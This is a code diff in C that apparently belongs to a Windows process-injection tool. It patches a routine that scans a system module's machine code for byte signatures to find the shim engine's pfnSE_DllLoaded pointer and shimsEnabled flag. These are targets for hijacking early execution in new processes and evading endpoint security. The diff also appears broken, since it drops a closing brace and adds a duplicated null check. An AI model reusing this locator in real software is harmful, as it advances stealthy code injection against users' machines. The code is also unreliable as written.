@@ -61,6 +61,7 @@ static BOOL ec_locate(EC_TARGETS * out)
 	out->shimsEnabled = NULL;
 	{
 		DWORD j;
+		unsigned char * cookieSite = NULL;
 		for (j = 0; j + 24 < textsz; j++) {
 			if (text[j] == 0x8B && text[j+1] == 0x14 && text[j+2] == 0x25 &&
 			    text[j+3] == 0x30 && text[j+4] == 0x03 && text[j+5] == 0xFE && text[j+6] == 0x7F) {
@@ -70,11 +71,13 @@ static BOOL ec_locate(EC_TARGETS * out)
 						/* insn end rva within module */
 						unsigned char * site = text + j + 19;
 						out->pfnSE_DllLoaded = site + disp;
+						cookieSite = text + j; /* start of the mov edx,[SDU+0x330] */
 					}
 				}
 			}
 		}
-	}
+		if (out->pfnSE_DllLoaded == NULL)
+			return FALSE;
 	if (out->pfnSE_DllLoaded == NULL)
 		return FALSE;
 
@@ -104,12 +107,14 @@ static BOOL ec_locate(EC_TARGETS * out)
 				}
 				if (!inData)
 					continue;
-				/* jne -> near the cookie load? */
+				/* jne -> near the cookie load? (compare against the CODE
+				 * site of the anchor, not the .mrdata target - the
+				 * python PoC compares jtarget vs cookie_site) */
 				if (text[a+7] == 0x0F && text[a+8] == 0x85) {
 					int jd = *(int *)(text + a + 9);
 					unsigned char * jtarget = text + a + 13 + jd;
-					long delta = (long)(jtarget - out->pfnSE_DllLoaded);
-					if (delta < 0 && delta > -0x800) {
+					long delta = (long)(jtarget - cookieSite);
+					if (delta < 0x40 && delta > -0x40) {
 						out->shimsEnabled = target;
 						break;
 					}
